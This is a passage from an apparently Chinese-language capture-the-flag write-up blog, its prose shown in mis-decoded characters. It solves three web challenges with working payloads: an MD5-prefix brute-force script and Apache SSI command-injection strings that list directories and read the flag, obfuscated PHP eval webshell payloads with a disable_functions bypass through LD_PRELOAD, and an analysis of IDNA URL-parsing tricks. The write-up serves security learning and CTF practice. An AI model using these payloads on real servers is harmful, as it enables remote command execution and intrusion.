class="hljs-keyword">function</span> <span class="hljs-title">get_hash</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;<br>		<span class="hljs-variable">$random</span> = <span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)].<span class="hljs-variable">$chars</span>[<span class="hljs-title function_ invoke__">mt_rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">73</span>)];<span class="hljs-comment">//Random 5 times</span><br>		<span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-variable">$random</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$content</span>); <br>	&#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br>	***<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span> )<br>    &#123;<br>        <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;6d0bc1&#x27;</span>;<br>        <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;<br>            <span class="hljs-variable">$file_shtml</span> = <span class="hljs-string">&quot;public/&quot;</span>.<span class="hljs-title function_ invoke__">get_hash</span>().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>            <span class="hljs-variable">$shtml</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$file_shtml</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>            <span class="hljs-variable">$text</span> = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">            ***</span><br><span class="hljs-string">			***&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$shtml</span>,<span class="hljs-variable">$text</span>);<br>            <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$shtml</span>);<br>            ***<br>			<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[!] Header  error ...&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;<br>            <br>    &#125;<span class="hljs-keyword">else</span><br>    &#123;<br>	***<br>    &#125;<br>	***<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$admin</span> == <span class="hljs-built_in">substr</span>(<span class="hljs-built_in">md5</span>($_POST<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;password&#x27;</span>]</span>),<span class="hljs-number">0</span>,<span class="hljs-number">6</span>))<br></code></pre></td></tr></table></figure>
<p>æ²¡æœ‰ç»•è¿‡æ–¹æ³•ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">import hashlib<br><br>def <span class="hljs-built_in">crack</span>(pre):<br>    for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">9999999</span>):<br>        if (hashlib.<span class="hljs-built_in">md5</span>(<span class="hljs-built_in">str</span>(i).<span class="hljs-built_in">encode</span>(<span class="hljs-string">&quot;UTF-8&quot;</span>)).<span class="hljs-built_in">hexdigest</span>())[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>] == <span class="hljs-built_in">str</span>(pre):<br>            <span class="hljs-built_in">print</span>(i)<br>            break<br><br><br><span class="hljs-built_in">crack</span>(<span class="hljs-string">&quot;6d0bc1&quot;</span>)<br></code></pre></td></tr></table></figure>
<p>å¾—å‡ºä¸º2020666<br>è¾“å…¥</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">password</span>=<span class="hljs-number">2020666</span>&amp;username=admin<br></code></pre></td></tr></table></figure>

<p>é¡µé¢å‘å‡ºè­¦å‘Šè¯´æ˜å·²ç»é€šè¿‡</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">$file_shtml = <span class="hljs-string">&quot;public/&quot;</span>.get_hash().<span class="hljs-string">&quot;.shtml&quot;</span>;<br>          $shtml = fopen($file_shtml, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Unable to open file!&quot;</span>);<br>          $text = <span class="hljs-string">&#x27;</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">          &lt;h1&gt;Hello,&#x27;</span>.$_POST[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/h1&gt;</span><br><span class="hljs-string">          ***</span><br><span class="hljs-string">	***&#x27;</span>;<br>          fwrite($shtml,$text);<br>          fclose($shtml);<br></code></pre></td></tr></table></figure>
<p>è¿™é‡Œçš„get_hash()å€¼æ˜¯ä¸å¯èƒ½æ±‚å‡ºæ¥çš„ï¼Œåªèƒ½æ‰¾å‡ºæ¥ï¼Œå†åœ¨é¡µé¢ä¸Šæ‰¾æ‰¾<br><img src="/images/MUW7PLXTC8KCQ5YHP.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/images/NLRFZRXO510E.png" srcset="/img/loading.gif" lazyload><br>çœ‹åˆ°client ipå°±æƒ³xffä¸€ä¸‹ï¼Œå¯æƒœxä¸äº†<br>è¿™é¢˜çš„æ€è·¯æ˜¯åˆ©ç”¨â€Apache SSIè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´â€<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11226439.html">Apache SSI è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°</a><br>é¡µé¢å›æ˜¾äº†usernameï¼Œpasswordä¸èƒ½åŠ¨<br>çœ‹åˆ°.shtmlåç¼€ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ä¸€ä¸‹<br>å½“ç›®æ ‡æœåŠ¡å™¨å¼€å¯äº†SSIä¸CGIæ”¯æŒ,æˆ‘ä»¬å°±å¯ä»¥ä¸Šä¼ shtml,åˆ©ç”¨<code>&lt;!--#exec cmd=&quot;id&quot; --&gt;</code>è¯­æ³•æ‰§è¡Œå‘½ä»¤ã€‚<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>
<p>è¿›å…¥æ–°ç”Ÿæˆçš„urlæŸ¥çœ‹<br><img src="/images/ZJ4P7M6GGO.png" srcset="/img/loading.gif" lazyload><br>è¿™ä¹ˆå¤šçš„é“¾æ¥ï¼Œè¦è¯•åˆ°çŒ´å¹´é©¬æœˆ<br>å»æ ¹ç›®å½•çœ‹çœ‹<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls /&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>
<p><img src="/images/EP83OM9ZY8K5GK.png" srcset="/img/loading.gif" lazyload><br>æ²¡æœ‰ï¼Œé‚£ä¸Šä¸€çº§çœ‹çœ‹<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;ls ../&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>
<p><img src="/images/MHS82ETVEKT1RC6.png" srcset="/img/loading.gif" lazyload><br>çœ‹åˆ°ä½ç½®ç›´æ¥cat<br>payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;</span>&amp;password=2020666<br></code></pre></td></tr></table></figure>
<p><img src="/images/CVZTGYF5UOP7U2YGKY.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><p>è¿™é¢˜æºç éå¸¸ç®€å•ï¼Œå°±æ˜¯è¦ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¸èƒ½ä½¿ç”¨æ¢è¡Œç¬¦æ¥ç»•è¿‡ï¼Œè¦ä½¿ç”¨phpå¼‚æˆ–æ“ä½œå³å¯ç»•è¿‡æˆ–é€šè¿‡urlç¼–ç ç»•è¿‡,å–åç»•è¿‡<br>ä½†æ˜¯ã€‚ã€‚ã€‚<br>è¿˜æ˜¯æ²¡æœ‰è¿™ä¹ˆç®€å•ï¼Œæœ¬é¢˜ä¸»è¦å†…å®¹æ˜¯disable_functionç¦ç”¨äº†å¤§é‡çš„å‡½æ•°å¯¼è‡´shellä¸Šä¼ æˆåŠŸä½†æ— æ³•ä½¿ç”¨çš„æƒ…å†µå‡ºç°ä½¿å¾—éš¾åº¦å¤§å¤§æé«˜<br>å…ˆå–åç»•è¿‡<br>å–åæ“ä½œå¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phpinfo&#x27;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><br>&gt;<br>payload<br>?code=(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)();<br></code></pre></td></tr></table></figure>
<p>æŸ¥çœ‹phpinfo</p>
<p>æ“ä¸€ä¸ªshell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$c</span>=<span class="hljs-string">&#x27;(eval($_POST[a]))&#x27;</span>;<br><span class="hljs-variable">$d</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$d</span>;<br><span class="hljs-meta">?&gt;</span><br>åœ¨PHPä¸­ï¼Œ~ æ˜¯æŒ‰ä½å–åè¿ç®—ç¬¦ï¼Œè€Œç”¨urlç¼–ç æ˜¯é¿å…ä¸å¯è§å­—ç¬¦<br><span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;D&quot;</span>^<span class="hljs-string">&quot;C&quot;</span>                  å¼‚æˆ–<br><span class="hljs-comment">//$a=&#x27; </span><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-string">&quot;B&quot;</span>);        å–å<br><span class="hljs-comment">//$a=%BB                ç”±äºå–åç»“æœæ˜¯ä¸€ä¸ªä¸å¯è§çš„å­—ç¬¦ã€‚æ‰€ä»¥æˆ‘ä»¬é€šè¿‡URLç¼–ç è¾“å‡ºã€‚æµè§ˆå™¨ä¼šè‡ªåŠ¨è§£ç ã€‚~&quot;B&quot;=~%BB</span><br><span class="hljs-comment">//ä¸å¤ªæ˜ç™½ä¸ºä»€ä¹ˆè¦ç”¨assert</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/IUW8YX16KKFF6HS.png" srcset="/img/loading.gif" lazyload><br>é€šè¿‡phpinfo()é¡µé¢å¯çŸ¥<br><img src="/images/I1AISR2SJBF6ZWJ4.png" srcset="/img/loading.gif" lazyload><br>åœ¨phpinfo()é¡µé¢å¯ä»¥å‘ç°ç¦ç”¨äº†éå¸¸å¤šçš„å‡½æ•°ï¼Œå…¶ä¸­åŒ…æ‹¬systemã€execã€shell_execç­‰å…³é”®æ‰§è¡Œå‡½æ•°<br>æœ‰shelläº†å°±è¿ä¸‹èšå‰‘<br>è¿æ¥å‘ç°æ ¹ç›®å½•æœ‰flagï¼Œä½†æ˜¯ä¸ºç©ºï¼Œè¿˜æœ‰ä¸€ä¸ªreadflagæ–‡ä»¶<br>è¿™é‡Œå¯ä»¥å‘ç°readflagè¿™ä¸ªæ–‡ä»¶ä½†æ˜¯å¹¶æ²¡æœ‰æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥å¾—ç»•è¿‡disable_function<br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">å·§ç”¨LD_PRELOADçªç ´disable_functions</a><br>é€šè¿‡æ–‡ç« å¯ä»¥äº†è§£åˆ°<br>å¯¼è‡´ webshell ä¸èƒ½æ‰§è¡Œå‘½ä»¤çš„åŸå› å¤§æ¦‚æœ‰ä¸‰ç±»ï¼šä¸€æ˜¯ php.ini ä¸­ç”¨ disable_functions æŒ‡ç¤ºå™¨ç¦ç”¨äº† system()ã€exec() ç­‰ç­‰è¿™ç±»å‘½ä»¤æ‰§è¡Œçš„ç›¸å…³å‡½æ•°ï¼›äºŒæ˜¯ web è¿›ç¨‹è¿è¡Œåœ¨ rbash è¿™ç±»å—é™ shell ç¯å¢ƒä¸­ï¼›ä¸‰æ˜¯ WAF æ‹¦åŠ«ã€‚è‹¥æ˜¯ä¸€åˆ™æ— æ³•æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œè‹¥æ˜¯äºŒã€ä¸‰åˆ™å¯ä»¥æ‰§è¡Œå°‘é‡å‘½ä»¤ã€‚</p>
<p>æœ‰å››ç§ç»•è¿‡ disable_functions çš„æ‰‹æ³•ï¼šç¬¬ä¸€ç§ï¼Œæ”»å‡»åç«¯ç»„ä»¶ï¼Œå¯»æ‰¾å­˜åœ¨å‘½ä»¤æ³¨å…¥çš„ã€web åº”ç”¨å¸¸ç”¨çš„åç«¯ç»„ä»¶ï¼Œå¦‚ï¼ŒImageMagick çš„é­”å›¾æ¼æ´ã€bash çš„ç ´å£³æ¼æ´ï¼›ç¬¬äºŒç§ï¼Œå¯»æ‰¾æœªç¦ç”¨çš„æ¼ç½‘å‡½æ•°ï¼Œå¸¸è§çš„æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰ system()ã€exec()ã€shell_exec()ã€passthru()ï¼Œååƒ»çš„ popen()ã€proc_open()ã€pcntl_exec()ï¼Œé€ä¸€å°è¯•ï¼Œæˆ–è®¸æœ‰æ¼ç½‘ä¹‹é±¼ï¼›ç¬¬ä¸‰ç§ï¼Œmod_cgi æ¨¡å¼ï¼Œå°è¯•ä¿®æ”¹ .htaccessï¼Œè°ƒæ•´è¯·æ±‚è®¿é—®è·¯ç”±ï¼Œç»•è¿‡ php.ini ä¸­çš„ä»»ä½•é™åˆ¶ï¼›ç¬¬å››ç§ï¼Œåˆ©ç”¨ç¯å¢ƒå˜é‡ LD_PRELOAD åŠ«æŒç³»ç»Ÿå‡½æ•°ï¼Œè®©å¤–éƒ¨ç¨‹åºåŠ è½½æ¶æ„ *.soï¼Œè¾¾åˆ°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ•ˆæœã€‚</p>
<p>ä¸‹è½½åšä¸»æ•´ç†çš„æºç <br>ä¸Šä¼ åˆ°èšå‰‘çš„var&#x2F;tmpç›®å½•ä¸‹<br><img src="/images/IDZ3WZLUP4E34ZIGIN.png" srcset="/img/loading.gif" lazyload><br>æˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°cmdä¸ºæ‰§è¡Œçš„å‘½ä»¤ï¼Œç¬¬äºŒä¸ªå‚æ•°outpathä¸ºè¾“å…¥å‡ºæ–‡ä»¶ä½ç½®ï¼Œç¬¬ä¸‰ä¸ªsopathå‚æ•°ä¸ºä¸Šä¼ çš„soæ–‡ä»¶æ‰€åœ¨ä½ç½®<br>payload:</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sas">?code=$&#123;<span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span>^<span class="hljs-title function_">%a1</span><span class="hljs-title function_">%b9</span><span class="hljs-title function_">%bb</span><span class="hljs-title function_">%aa</span>&#125;[_]($&#123;<span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span><span class="hljs-title function_">%fe</span>^<span class="hljs-title function_">%a1</span><span class="hljs-title function_">%b9</span><span class="hljs-title function_">%bb</span><span class="hljs-title function_">%aa</span>&#125;[__]);<span class="hljs-variable">&amp;_</span>=assert<span class="hljs-variable">&amp;__</span>=include(%27/var/tmp/bypass_disablefunc.php%27)<span class="hljs-variable">&amp;cmd</span>=/readflag<span class="hljs-variable">&amp;outpath</span>=/tmp/tmpfile<span class="hljs-variable">&amp;sopath</span>=/var/tmp/bypass_disablefunc_x64.so<br>è¿™é‡Œä½¿ç”¨çš„æ˜¯å¼‚æˆ–ç»•è¿‡%##ä¸º16è¿›åˆ¶æ ¼å¼,å¼‚æˆ–è½¬åŒ–ä¸ºä¸‹<br>?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[__]);<span class="hljs-variable">&amp;_</span>=assert<span class="hljs-variable">&amp;__</span>=include(%27/var/tmp/bypass_disablefunc.php%27)<span class="hljs-variable">&amp;cmd</span>=/readflag<span class="hljs-variable">&amp;outpath</span>=/tmp/tmpfile<span class="hljs-variable">&amp;sopath</span>=/var/tmp/bypass_disablefunc_x64.so<br>//å…¶ä¸­$&#123;_GET&#125;[_]ä¸$_GET[_]ç”¨æ³•ç±»ä¼¼ï¼Œä½†æœ¬é¢˜ç¬¬äºŒç§æ–¹æ³•è¯•äº†æ²¡é€šè¿‡ï¼Œå¯èƒ½æ˜¯å› ä¸ºç½‘ç»œé—®é¢˜ï¼Œæ²¡æœ‰æµ‹è¯•å¾ˆå¤šæ¬¡ï¼Œåå…­è¿›åˆ¶æ•°å¯¹åº”çš„å­—ç¬¦å°½é‡ä¸ºä¸å¯è§å­—ç¬¦ï¼Œä¸ç„¶ä¼šè¢«æµè§ˆå™¨ç¼–è¯‘ï¼Œå¯¼è‡´å¤±è´¥ã€‚ã€‚ã€‚<br></code></pre></td></tr></table></figure>
<p><img src="/images/FYRDD8A02HBUVNJJFWD.png" srcset="/img/loading.gif" lazyload><br>è‡³æ­¤ä»¥å¤§åŠŸå‘Šæˆ</p>
<p>è¿™é‡Œèšå‰‘æœ‰ä¸ªæ’ä»¶<br><img src="/images/2762C95453324fd08E27D302C87A5848.png" srcset="/img/loading.gif" lazyload><br>é€šè¿‡åŠ è½½æ’ä»¶å¯åŠ¨PHP7_GC_UAF<br><img src="/images/DC94F72BF0B541ca8568BFE37596601F.png" srcset="/img/loading.gif" lazyload><br>ç‚¹å‡»å¼€å§‹åå°±å¯ä»¥è¾“å…¥å‘½ä»¤äº†<br><img src="/images/C4D562C46F3E41b68215A68D0BB30357.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2><p><img src="/images/NUADL8I15TFAOGUYBJE0V.png" srcset="/img/loading.gif" lazyload><br>å°†é¢˜ç›®ç»™çš„ä»£ç æ•´ç†ä¸€ä¸‹</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@app</span>.<span class="hljs-built_in">route</span>(<span class="hljs-string">&#x27;/getUrl&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-built_in">getUrl</span>():<br>    url = request.args.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;url&quot;</span>)<br>    host = parse.<span class="hljs-built_in">urlparse</span>(url).hostname #è·å–åŸŸåip ä¾‹ï¼šwww.xxxx.com<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 111&quot;</span><br>    parts = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">urlsplit</span>(url)) <br>    host = parts[<span class="hljs-number">1</span>]<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 222 &quot;</span> + host<br>    newhost = []<br>    for h in host.<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost.<span class="hljs-built_in">append</span>(h.<span class="hljs-built_in">encode</span>(<span class="hljs-string">&#x27;idna&#x27;</span>).<span class="hljs-built_in">decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-built_in">join</span>(newhost)<br>    #å»æ‰ url ä¸­çš„ç©ºæ ¼<br>    finalUrl = <span class="hljs-built_in">urlunsplit</span>(parts).<span class="hljs-built_in">split</span>(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>    host = parse.<span class="hljs-built_in">urlparse</span>(finalUrl).hostname<br>    if host == <span class="hljs-string">&#x27;suctf.cc&#x27;</span>:<br>        return urllib.request.<span class="hljs-built_in">urlopen</span>(finalUrl).<span class="hljs-built_in">read</span>()<br>    <span class="hljs-attribute">else</span>:<br>        return <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 333&quot;</span><br></code></pre></td></tr></table></figure>

<p>è¿™é“é¢˜ç”¨çš„æ˜¯blackhatè®®é¢˜ä¹‹ä¸€HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization<br>nginxé…ç½®æ–‡ä»¶è·¯å¾„ black hatä¸€ä¸ªè®®é¢˜ ä»»æ„è¯»å–æ–‡ä»¶<br><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">åŸé“¾æ¥åœ¨è¿™</a><br>å…ˆæ¥åˆ†æä»£ç <br>å¯¹å‡ ä¸ªå‡½æ•°è¿›è¡Œè§£é‡Š<br>urlsplit(url)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">url = <span class="hljs-string">&quot;https://username:password@www.baidu.com:80/index.html;parameters?name=tom#example&quot;</span><br><br><span class="hljs-built_in">print</span>(urlsplit(url))<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">SplitResult(</span><br><span class="hljs-string">    scheme=&#x27;https&#x27;, </span><br><span class="hljs-string">    netloc=&#x27;username:password@www.baidu.com:80&#x27;, </span><br><span class="hljs-string">    path=&#x27;/index.html;parameters&#x27;, </span><br><span class="hljs-string">    query=&#x27;name=tom&#x27;, </span><br><span class="hljs-string">    fragment=&#x27;example&#x27;)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> host<span class="hljs-selector-class">.split</span>(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        newhost<span class="hljs-selector-class">.append</span>(h<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;idna&#x27;</span>)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure>
<p>å¯¹å­—ç¬¦ä¸² host è¿›è¡Œäº†æ‹†åˆ†ï¼ˆsplitï¼‰æ“ä½œï¼Œç„¶åå¯¹æ¯ä¸ªåˆ†å‰²åçš„å­å­—ç¬¦ä¸²è¿›è¡Œäº†IDNAç¼–ç å’ŒUTF-8è§£ç ï¼Œæœ€ç»ˆå°†ç»“æœæ·»åŠ åˆ°åä¸º newhost çš„åˆ—è¡¨ä¸­ã€‚</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">return urllib<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.urlopen</span>(finalUrl)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure>
<p>ä½¿ç”¨äº† urllib.request.urlopen å‡½æ•°æ¥æ‰“å¼€æŒ‡å®šçš„URLï¼ˆfinalUrlï¼‰ï¼Œå¹¶è°ƒç”¨ read() æ–¹æ³•è¯»å–è¯¥URLè¿”å›çš„æ•°æ®ã€‚</p>
<p>æ”¹ä¸€ä¸‹ä»£ç ï¼Œæ•´ä½“è¿è¡Œä¸€ä¸‹</p>
